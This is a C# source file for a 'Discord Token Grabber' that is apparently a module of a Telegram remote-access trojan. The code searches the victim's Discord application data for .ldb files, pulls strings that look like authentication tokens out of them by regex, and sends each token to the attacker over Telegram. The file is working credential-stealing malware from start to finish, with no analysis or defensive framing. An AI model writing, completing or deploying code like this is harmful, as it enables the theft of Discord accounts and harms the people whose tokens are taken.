// Author  : NYAN CAT
// Name    : Discord Token Grabber
// Contact : https://github.com/NYAN-x-CAT

using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace TelegramRAT
{
    internal class DiscordGrabber
    {

        // Get token
        public static void get()
        {
            var files = SearchForFile();
            if (files.Count == 0)
            {
                telegram.sendText("⛔ Didn't find any ldb files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        telegram.sendText($"💎 Discord token: {match.ToString()}");
                    }
                }
            }
        }

        // Locate *.ldb files
        private static List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            string discordPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord");
            if (!Directory.Exists(discordPath))
            {
                telegram.sendText($"⛔ Discord path not found: {discordPath}");
                return ldbFiles;
            }

            try
            {
                string[] files = Directory.GetFiles(discordPath, "*.ldb", SearchOption.AllDirectories);

                foreach (string file in files)
                {
                    try
                    {
                        string content = File.ReadAllText(file);
                        if (content.Contains("oken")) // Slightly broader check to avoid "okay" false positives.
                        {
                            ldbFiles.Add(content);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error reading file {file}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error searching for files: {ex.Message}");
                telegram.sendText($"⛔ Error searching for ldb files: {ex.Message}");
            }
            return ldbFiles;
        }


    }
}
